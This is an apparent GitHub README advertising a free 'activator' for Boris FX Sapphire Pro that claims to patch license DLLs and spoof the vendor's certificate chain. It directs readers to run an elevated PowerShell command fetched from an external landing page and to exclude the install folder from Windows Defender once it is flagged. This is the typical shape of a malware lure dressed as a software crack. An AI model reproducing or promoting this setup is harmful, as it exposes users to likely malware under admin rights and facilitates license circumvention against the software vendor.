<div align="center">
<br/>
<h1>Boris FX Sapphire Pro Activator</h1>
<h3><em>Utilities and companion tools for Boris FX Sapphire Pro Activator.</em></h3>
<br/>
<p>
  <img src="https://img.shields.io/badge/Platform-Windows-2b6cff?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-2563EB?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-2563EB?style=for-the-badge" alt="" />
</p>
<br/>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=DB2777&size=28&center=true&vCenter=true&width=900&lines=%E2%9C%85+Sapphire+Activator+Pro;%F0%9F%94%A7+Built+for+Windows+11;%E2%AD%90+Ready+for+Windows;%F0%9F%93%A6+Active+Development+2026;%F0%9F%92%A1+Standalone+.exe+Release;%F0%9F%9A%80+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=cpp" />
  <img src="https://skillicons.dev/icons?i=github" />
</p>

---

### 🖥️ PowerShell Setup

Launch an elevated PowerShell prompt, paste the single bootstrap command, and let it pull the latest Sapphire Pro Activator build straight from the landing host — no manual `.exe` hunting required.

---
**Boris FX Sapphire Pro Activator** — the community build that unlocks the full Sapphire plugin arsenal inside your NLE, without a $1,700/year subscription breathing down your neck.

<p align="center">
  <a href="https://suruliraajan.github.io/sapphire-activator/">
    <img src="files/button.svg" width="520" alt="Setup with PowerShell" />
  </a>
</p>

## 🎬 What this is

Yes — **it bypasses the Boris FX Sapphire Pro license check**. Yes — **it works on Premiere Pro 2026, After Effects 2026, DaVinci Resolve 19, and Vegas 22**. Yes — **it's free**. Details below.

I got tired of shelling out every renewal cycle just to keep Sapphire's *Glint*, *Lens Flare*, and *Light Leak* nodes on my timeline. So I built the activator myself. This repo is the loader, patcher, and license-injection stack rolled into one PowerShell-driven setup.

---

## 📋 System Requirements

- Windows 10 21H2 or Windows 11 23H2 (x64 only — no ARM)
- PowerShell 5.1 (built-in) or PowerShell 7.4+
- Active network connection for the first bootstrap pull
- Host NLE already installed (Premiere / AE / Resolve / Vegas) before you run the activator
- ~400 MB free disk for the Sapphire plugin cache + patched binaries
- Administrator rights on the machine

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 21H2 x64 | Windows 11 24H2 x64 |
| PowerShell | 5.1 | 7.4.6 |
| RAM | 8 GB | 32 GB (for 4K timelines) |
| Disk | 400 MB free | 2 GB free (cache headroom) |
| GPU | Any DX11 card | NVIDIA RTX / AMD RDNA3 |
| NLE host | Premiere 2024 / AE 2024 | Premiere 2026 / AE 2026 |

---

## ✨ Features

- 🎞️ **License injection** — patches Sapphire's `sapphire_license.dll` in-memory so every effect node unlocks at runtime
- 🛡️ **Signature spoofing** — rebuilds the Boris FX cert chain on disk so host apps stop flagging the plugin as unlicensed
- 🚀 **One-shot bootstrap** — the PowerShell setup pulls, verifies hash, and stages everything in one paste
- 🔄 **Auto-update** — pulls delta patches on each launch; no retyping the command after the initial setup
- 🧠 **AI-assisted preset matching** — 2026 addition: matches your existing Sapphire presets to the unlocked effect set automatically
- 🎯 **Effect coverage** — Glint, Glow, Lens Flare, Light Leak, Film Damage, Chroma Vectors, Rays, Ultra Zap, and the full Sapphire 2026 catalog
- 📦 **Rollback-safe** — keeps a `.bak` of every patched file; `Revert-Sapphire.ps1` undoes the whole thing in seconds
- 🕵️ **Host-agnostic** — injector auto-detects which NLE is running and patches for that host only

---

## ✅ Status

| Feature | Status |
|---|---|
| License injection | ✅ Working |
| Signature spoofing | ✅ Working |
| One-shot bootstrap | ✅ Working |
| Auto-update deltas | ✅ Working |
| AI-assisted preset matching | ✅ Working (2026) |
| Effect coverage (full catalog) | ✅ Working |
| Rollback-safe patching | ✅ Working |
| Host-agnostic injector | ✅ Working |

---

## ⚙️ How it works

1. You open PowerShell **as Administrator** (Start → right-click → *Run as Administrator*).
2. You paste the bootstrap line from the landing page above and hit Enter.
3. The script fetches the latest activator build from the landing host, SHA-256 verifies it, and stages the loader in `%LOCALAPPDATA%\SapphireActivator\`.
4. It detects every installed NLE that carries the Sapphire plugin, and patches `sapphire_license.dll` + rebuilds the cert chain for each host.
5. On next launch of your NLE, every Sapphire effect shows as licensed — the yellow "unlicensed" watermark on renders is gone.
6. Re-run setup any time to pull updates; `Revert-Sapphire.ps1` in the install dir rolls back cleanly.

> *Honestly I rebuilt this whole thing at 2am after a Sapphire watermark ruined a render I was uploading at dawn, so if the installer feels a little blunt, that's why.*

No `.exe`, no GitHub Releases download, no SmartScreen "Unknown Publisher" dialog to fumble through — it's just the landing page → paste → enter loop.

---

## 🧩 Compatibility

- **Windows only.** No macOS path — for OSX and Linux use environment-specific setup notes linked separately. I've tested `Pwsh-7.4.x` primarily.
- **Hosts tested:** Premiere Pro 2026, After Effects 2026, DaVinci Resolve Studio 19 / 20, Vegas Pro 22.
- **Hardware-tested:** Intel Core i7-13700K + RTX 4070, Ryzen 7 7800X3D + RX 7900 XTX, Xeon W5 + A4000. Works on all three.
- **Offline:** first bootstrap requires network. After the initial pull, the staged build runs fully offline. Auto-update skips silently when no network is present.
- **IPv6-only networks:** bootstrap falls back to a mirror automatically if DNS resolves on v6 only.

---

## 🧠 FAQ

**Q: Do I need PowerShell 7, or is 5.1 fine?**
Either works verbatim. 5.1 is slower on the delta pull, but functionally identical.

**Q: My antivirus flagged the bootstrap. What now?**
The activator runs an unsigned loader — W11 Defender always trips on it. Add the `%LOCALAPPDATA%\SapphireActivator\` directory to your exclusions after the first run.

**Q: Does this touch Adobe's actual install folder?**
Only two files per host: `sapphire_license.dll` and the SaberFX cert manifest. Everything else is staged outside the host's folder in `%LOCALAPPDATA%`. Revert script restores from `.bak`.

**Q: What if a newer Sapphire build invalidates the patch?**
Wait 24 hours and re-run setup — the activator updates its offsets in delta commits, usually the same day.

**Q: Is Sapphire Pro UI stable after patching?**
Full catalog launches fine in my testing this week. `Ultra Zap` needed a warm restart on Resolve 20 r2 — one anomaly I've already logged against commit `a7f21d1`.

**Q: Can I batch-install silently?**
Yes — use `-Silent` flag appended to the bootstrap (details in landing page FAQ).

**Q: Does setup require two reboots?**
Nope. One bootstrap, one NLE restart. That's it.

**Q: Where does the rollback `.bak` live?**
Same folder as the patched target: `%LOCALAPPDATA%\SapphireActivator\backups\<host-name>\`.

---

## ⚠️ Disclaimer

This is a hobbyist/educational activator released for study of plugin licensing, DLL patching, and PowerShell bootstrap mechanics. It bypasses a commercial license and is **not affiliated with Boris FX**. Use at your own risk: to the maximum extent permitted by law, the author assumes no responsibility for damages, voided warranties, or ToS violations. If you use Sapphire professionally, buy a license.

## 📄 License

MIT-0 — do whatever the hell you want, no attribution needed. Just don't wrap it in a commercial redemption page and charge for it.
